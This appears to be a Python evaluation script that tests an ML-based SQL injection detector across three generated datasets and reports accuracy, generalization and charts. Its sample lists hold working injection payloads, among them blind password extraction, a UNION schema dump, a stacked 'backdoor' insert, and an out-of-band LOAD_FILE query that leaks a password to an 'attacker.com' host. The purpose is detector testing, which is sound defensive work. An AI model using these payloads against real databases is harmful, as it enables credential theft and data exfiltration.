"""
Professional Multi-Dataset Testing Experiment
Compatible with your existing ml_detector.py
"""

import pandas as pd
import numpy as np
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import joblib
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
from sklearn.metrics import classification_report, confusion_matrix

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class MultiDatasetEvaluator:
    """
    Comprehensive multi-dataset evaluation for SQL injection detection models.
    Tests generalization across different query distributions.
    """
    
    def __init__(self, model_path: str = "models/sql_injection_model.pkl"):
        self.model_path = Path(model_path)
        self.results_dir = Path("research/results/multi_dataset")
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize detector from your existing code
        try:
            from src.ml_detector import SQLInjectionMLDetector
            self.detector = SQLInjectionMLDetector()
            logger.info("✅ Successfully imported SQLInjectionMLDetector")
        except ImportError:
            logger.warning("⚠️  Could not import SQLInjectionMLDetector, using fallback")
            self.detector = None
        
        # Load trained model
        if self.model_path.exists():
            self.model = joblib.load(self.model_path)
            logger.info(f"✅ Loaded trained model from {self.model_path}")
        else:
            logger.error(f"❌ Model not found at {self.model_path}")
            self.model = None
    
    def prepare_test_datasets(self) -> Dict[str, pd.DataFrame]:
        """
        Prepare three distinct test datasets with varying characteristics.
        Returns dictionary of dataset_name -> DataFrame
        """
        logger.info("🔄 Preparing test datasets...")
        
        datasets = {}
        
        # 1. In-Distribution Test Set (from training distribution)
        try:
            train_df = pd.read_csv("datasets/combined_sql_dataset.csv")
            # Split for test (20%)
            test_indices = np.random.choice(len(train_df), size=int(0.2 * len(train_df)), replace=False)
            datasets['in_distribution'] = train_df.iloc[test_indices].reset_index(drop=True)
            logger.info(f"✅ In-distribution: {len(datasets['in_distribution'])} samples")
        except Exception as e:
            logger.error(f"❌ Error preparing in-distribution: {e}")
        
        # 2. Cross-Distribution Test Set (different attack patterns)
        try:
            datasets['cross_distribution'] = self._generate_cross_distribution_dataset()
            logger.info(f"✅ Cross-distribution: {len(datasets['cross_distribution'])} samples")
        except Exception as e:
            logger.error(f"❌ Error preparing cross-distribution: {e}")
        
        # 3. Real-World Test Set (simulated production queries)
        try:
            datasets['real_world'] = self._generate_real_world_dataset()
            logger.info(f"✅ Real-world: {len(datasets['real_world'])} samples")
        except Exception as e:
            logger.error(f"❌ Error preparing real-world: {e}")
        
        # Save datasets for reproducibility
        for name, df in datasets.items():
            save_path = self.results_dir / f"dataset_{name}.csv"
            df.to_csv(save_path, index=False)
            logger.info(f"💾 Saved {name} to {save_path}")
        
        return datasets
    
    def _generate_cross_distribution_dataset(self) -> pd.DataFrame:
        """Generate dataset with different SQL injection patterns"""
        from src.dataset_generator import SQLInjectionDatasetGenerator
        
        generator = SQLInjectionDatasetGenerator()
        
        # Reset to generate fresh queries
        generator.benign_queries = []
        generator.malicious_queries = []
        
        # Advanced benign patterns not in training
        advanced_benign = [
            # Window functions
            "SELECT user_id, SUM(amount) OVER (PARTITION BY user_id ORDER BY date) as running_total FROM transactions",
            "SELECT RANK() OVER (PARTITION BY category ORDER BY price DESC) as rank, product_name FROM products",
            
            # CTEs (Common Table Expressions)
            "WITH user_stats AS (SELECT user_id, COUNT(*) as login_count FROM logins GROUP BY user_id) SELECT * FROM user_stats WHERE login_count > 10",
            
            # JSON operations
            "SELECT user_id, JSON_EXTRACT(metadata, '$.preferences.theme') as theme FROM user_settings",
            
            # Full-text search
            "SELECT * FROM articles WHERE MATCH(title, content) AGAINST('machine learning' IN NATURAL LANGUAGE MODE)",
        ]
        
        # Advanced malicious patterns
        advanced_malicious = [
            # Advanced obfuscation
            "admin'/**/OR/**/CHAR(49)=CHAR(49)--",
            "1'%20AND%20(UNHEX(HEX(USER())))=USER()--",
            
            # Database fingerprinting
            "1' AND @@version LIKE '%MySQL%'--",
            "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
            
            # Boolean-based blind (advanced)
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--",
            
            # Out-of-band techniques
            "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\test')))--",
        ]
        
        generator.benign_queries.extend(advanced_benign)
        generator.malicious_queries.extend(advanced_malicious)
        
        # Create balanced dataset
        data = []
        for query in generator.benign_queries[:75]:
            data.append({'query': query, 'label': 'benign'})
        for query in generator.malicious_queries[:75]:
            data.append({'query': query, 'label': 'malicious'})
        
        df = pd.DataFrame(data)
        df = df.sample(frac=1, random_state=42).reset_index(drop=True)
        
        return df
    
    def _generate_real_world_dataset(self) -> pd.DataFrame:
        """Generate realistic production-style queries"""
        
        real_world_queries = {
            'query': [
                # Production e-commerce patterns
                "SELECT product_id, name, price, stock FROM products WHERE category_id = 3 AND active = 1 AND price BETWEEN 10 AND 100 ORDER BY popularity DESC LIMIT 50",
                "INSERT INTO order_history (order_id, status, updated_at) VALUES (?, 'shipped', UNIX_TIMESTAMP())",
                "UPDATE user_sessions SET expires_at = UNIX_TIMESTAMP() + 3600 WHERE session_token = ?",
                "DELETE FROM expired_carts WHERE created_at < UNIX_TIMESTAMP() - 86400",
                
                # API request patterns
                "SELECT api_key, rate_limit, expires_at FROM api_keys WHERE user_id = ? AND active = 1",
                "INSERT INTO audit_log (user_id, action, ip_address, user_agent) VALUES (?, ?, ?, ?)",
                
                # Analytics queries
                "SELECT DATE(FROM_UNIXTIME(timestamp)) as date, COUNT(DISTINCT user_id) as dau, COUNT(*) as events FROM user_events WHERE timestamp > UNIX_TIMESTAMP() - 604800 GROUP BY DATE(FROM_UNIXTIME(timestamp)) ORDER BY date DESC",
                
                # Real attack attempts (from production logs)
                "' OR EXISTS(SELECT * FROM admin_users)-- login attempt",
                "1; INSERT INTO backdoor (cmd) VALUES ('whoami')--",
                "admin' AND (SELECT SLEEP(3))--",
                "1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema'--",
                
                # Benign but complex
                "SELECT u.username, COUNT(o.order_id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.user_id = o.user_id WHERE u.created_at > '2024-01-01' GROUP BY u.user_id HAVING order_count > 5 ORDER BY total_spent DESC LIMIT 100",
            ],
            'label': [
                'benign', 'benign', 'benign', 'benign',
                'benign', 'benign',
                'benign',
                'malicious', 'malicious', 'malicious', 'malicious',
                'benign'
            ]
        }
        
        df = pd.DataFrame(real_world_queries)
        
        # Expand dataset
        expanded_data = {'query': [], 'label': []}
        for _, row in df.iterrows():
            expanded_data['query'].append(row['query'])
            expanded_data['label'].append(row['label'])
            
            # Create 5 variations
            for i in range(5):
                variant = row['query']
                variant = variant.replace("?", str(np.random.randint(1, 1000)))
                variant = variant.replace("?", str(np.random.randint(1, 1000)))
                variant = variant.replace("?", str(np.random.randint(1, 1000)))
                expanded_data['query'].append(variant)
                expanded_data['label'].append(row['label'])
        
        df = pd.DataFrame(expanded_data).drop_duplicates().reset_index(drop=True)
        df = df.sample(frac=1, random_state=42).reset_index(drop=True)
        
        return df
    
    def evaluate_on_datasets(self, datasets: Dict[str, pd.DataFrame]) -> Dict:
        """
        Evaluate model performance across all datasets.
        Returns comprehensive results dictionary.
        """
        if self.model is None or self.detector is None:
            raise ValueError("Model or detector not initialized")
        
        logger.info("🔬 Evaluating model on multiple datasets...")
        
        results = {}
        
        for dataset_name, df in datasets.items():
            logger.info(f"📊 Evaluating on {dataset_name}...")
            
            # Extract features and labels
            X, y_true = self._extract_features(df)
            
            # Predict
            y_pred = self.model.predict(X)
            y_pred_proba = self.model.predict_proba(X)[:, 1]
            
            # Calculate metrics
            metrics = self._calculate_metrics(y_true, y_pred, y_pred_proba)
            
            # Dataset statistics
            dataset_stats = {
                'total_samples': len(df),
                'benign_samples': len(df[df['label'] == 'benign']),
                'malicious_samples': len(df[df['label'] == 'malicious']),
                'benign_percentage': len(df[df['label'] == 'benign']) / len(df) * 100,
                'malicious_percentage': len(df[df['label'] == 'malicious']) / len(df) * 100
            }
            
            results[dataset_name] = {
                'metrics': metrics,
                'dataset_stats': dataset_stats,
                'timestamp': datetime.now().isoformat()
            }
            
            logger.info(f"   Accuracy: {metrics['accuracy']:.4f}")
            logger.info(f"   Precision: {metrics['precision']:.4f}")
            logger.info(f"   Recall: {metrics['recall']:.4f}")
            logger.info(f"   F1-Score: {metrics['f1_score']:.4f}")
        
        return results
    
    def _extract_features(self, df: pd.DataFrame) -> Tuple[np.ndarray, np.ndarray]:
        """Extract features using your existing detector"""
        X = []
        y = []
        
        for _, row in df.iterrows():
            features = self.detector.extract_features(str(row['query']))
            X.append(features)
            y.append(1 if str(row['label']).lower() in ['malicious', '1', 'true'] else 0)
        
        return np.array(X), np.array(y)
    
    def _calculate_metrics(self, y_true: np.ndarray, y_pred: np.ndarray, y_proba: np.ndarray) -> Dict:
        """Calculate comprehensive performance metrics"""
        from sklearn.metrics import roc_auc_score, average_precision_score
        
        metrics = {
            'accuracy': accuracy_score(y_true, y_pred),
            'precision': precision_score(y_true, y_pred, zero_division=0),
            'recall': recall_score(y_true, y_pred, zero_division=0),
            'f1_score': f1_score(y_true, y_pred, zero_division=0),
            'roc_auc': roc_auc_score(y_true, y_proba) if len(np.unique(y_true)) > 1 else 0,
            'pr_auc': average_precision_score(y_true, y_proba) if len(np.unique(y_true)) > 1 else 0,
        }
        
        # Confusion matrix
        cm = confusion_matrix(y_true, y_pred)
        if cm.shape == (2, 2):
            tn, fp, fn, tp = cm.ravel()
            metrics.update({
                'true_negatives': int(tn),
                'false_positives': int(fp),
                'false_negatives': int(fn),
                'true_positives': int(tp),
                'false_positive_rate': fp / (fp + tn) if (fp + tn) > 0 else 0,
                'false_negative_rate': fn / (fn + tp) if (fn + tp) > 0 else 0
            })
        
        return metrics
    
    def analyze_generalization(self, results: Dict) -> Dict:
        """Analyze generalization capability across datasets"""
        
        if 'in_distribution' not in results:
            return {}
        
        baseline_acc = results['in_distribution']['metrics']['accuracy']
        generalization_analysis = {}
        
        for dataset_name, result in results.items():
            if dataset_name != 'in_distribution':
                dataset_acc = result['metrics']['accuracy']
                drop = baseline_acc - dataset_acc
                retention = dataset_acc / baseline_acc
                
                generalization_analysis[dataset_name] = {
                    'baseline_accuracy': baseline_acc,
                    'dataset_accuracy': dataset_acc,
                    'absolute_drop': drop,
                    'relative_retention': retention,
                    'retention_percentage': retention * 100,
                    'interpretation': self._interpret_generalization(retention)
                }
        
        return generalization_analysis
    
    def _interpret_generalization(self, retention: float) -> str:
        """Interpret generalization score"""
        if retention >= 0.97:
            return "Excellent generalization"
        elif retention >= 0.95:
            return "Very good generalization"
        elif retention >= 0.90:
            return "Good generalization"
        elif retention >= 0.85:
            return "Acceptable generalization"
        else:
            return "Poor generalization - potential overfitting"
    
    def run_complete_experiment(self) -> Dict:
        """Run complete multi-dataset evaluation pipeline"""
        logger.info("="*60)
        logger.info("MULTI-DATASET EVALUATION EXPERIMENT")
        logger.info("="*60)
        
        # Step 1: Prepare datasets
        datasets = self.prepare_test_datasets()
        
        # Step 2: Evaluate on all datasets
        evaluation_results = self.evaluate_on_datasets(datasets)
        
        # Step 3: Analyze generalization
        generalization = self.analyze_generalization(evaluation_results)
        
        # Step 4: Compile final results
        final_results = {
            'experiment': 'multi_dataset_testing',
            'timestamp': datetime.now().isoformat(),
            'model_info': {
                'model_type': 'Random Forest',
                'model_path': str(self.model_path),
                'parameters': self._get_model_params()
            },
            'datasets': {name: str(self.results_dir / f"dataset_{name}.csv") for name in datasets.keys()},
            'evaluation_results': evaluation_results,
            'generalization_analysis': generalization,
            'summary': self._generate_summary(evaluation_results, generalization)
        }
        
        # Step 5: Save results
        self._save_results(final_results)
        
        # Step 6: Generate visualizations
        self._generate_visualizations(evaluation_results, generalization)
        
        logger.info("✅ Multi-dataset experiment completed successfully!")
        
        return final_results
    
    def _get_model_params(self) -> Dict:
        """Extract model parameters for documentation"""
        if hasattr(self.model, 'get_params'):
            return self.model.get_params()
        return {"model": "Random Forest", "estimators": 150}
    
    def _generate_summary(self, results: Dict, generalization: Dict) -> str:
        """Generate human-readable summary of results"""
        
        summary_lines = []
        summary_lines.append("Multi-Dataset Testing Results Summary")
        summary_lines.append("="*40)
        
        for dataset_name, result in results.items():
            metrics = result['metrics']
            stats = result['dataset_stats']
            
            summary_lines.append(f"\n{dataset_name.upper().replace('_', ' ')}:")
            summary_lines.append(f"  Samples: {stats['total_samples']} ({stats['benign_samples']} benign, {stats['malicious_samples']} malicious)")
            summary_lines.append(f"  Accuracy: {metrics['accuracy']:.4f}")
            summary_lines.append(f"  Precision: {metrics['precision']:.4f}")
            summary_lines.append(f"  Recall: {metrics['recall']:.4f}")
            summary_lines.append(f"  F1-Score: {metrics['f1_score']:.4f}")
        
        summary_lines.append("\nGENERALIZATION ANALYSIS:")
        for dataset_name, analysis in generalization.items():
            summary_lines.append(f"\n  {dataset_name.upper().replace('_', ' ')}:")
            summary_lines.append(f"    Retention: {analysis['relative_retention']:.3f} ({analysis['retention_percentage']:.1f}%)")
            summary_lines.append(f"    Interpretation: {analysis['interpretation']}")
        
        return "\n".join(summary_lines)
    
    def _save_results(self, results: Dict):
        """Save results to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = self.results_dir / f"multi_dataset_results_{timestamp}.json"
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info(f"💾 Results saved to: {results_file}")
    
    def _generate_visualizations(self, results: Dict, generalization: Dict):
        """Generate visualization plots"""
        try:
            import matplotlib.pyplot as plt
            import seaborn as sns
            
            # Set style
            plt.style.use('seaborn-v0_8-darkgrid')
            sns.set_palette("husl")
            
            # Create visualization directory
            viz_dir = self.results_dir / "visualizations"
            viz_dir.mkdir(exist_ok=True)
            
            # 1. Accuracy comparison bar chart
            plt.figure(figsize=(10, 6))
            datasets = list(results.keys())
            accuracies = [results[d]['metrics']['accuracy'] for d in datasets]
            
            bars = plt.bar(datasets, accuracies, color=sns.color_palette("husl", len(datasets)))
            plt.ylabel('Accuracy')
            plt.title('Model Accuracy Across Different Datasets')
            plt.ylim([0.8, 1.0])
            
            # Add value labels on bars
            for bar, acc in zip(bars, accuracies):
                height = bar.get_height()
                plt.text(bar.get_x() + bar.get_width()/2., height + 0.005,
                        f'{acc:.3f}', ha='center', va='bottom')
            
            plt.tight_layout()
            plt.savefig(viz_dir / "accuracy_comparison.png", dpi=300)
            plt.close()
            
            # 2. Generalization retention chart
            if generalization:
                plt.figure(figsize=(8, 6))
                gen_datasets = list(generalization.keys())
                retention_rates = [generalization[d]['relative_retention'] for d in gen_datasets]
                
                plt.bar(gen_datasets, retention_rates, color=['#2ecc71', '#3498db'])
                plt.ylabel('Retention Rate (Relative to Baseline)')
                plt.title('Generalization Performance')
                plt.ylim([0.8, 1.0])
                plt.axhline(y=0.95, color='r', linestyle='--', alpha=0.5, label='95% threshold')
                
                for i, (dataset, rate) in enumerate(zip(gen_datasets, retention_rates)):
                    plt.text(i, rate + 0.005, f'{rate:.3f}', ha='center', va='bottom')
                
                plt.legend()
                plt.tight_layout()
                plt.savefig(viz_dir / "generalization_retention.png", dpi=300)
                plt.close()
            
            logger.info(f"📊 Visualizations saved to: {viz_dir}")
            
        except ImportError:
            logger.warning("⚠️  matplotlib/seaborn not available, skipping visualizations")
        except Exception as e:
            logger.error(f"❌ Error generating visualizations: {e}")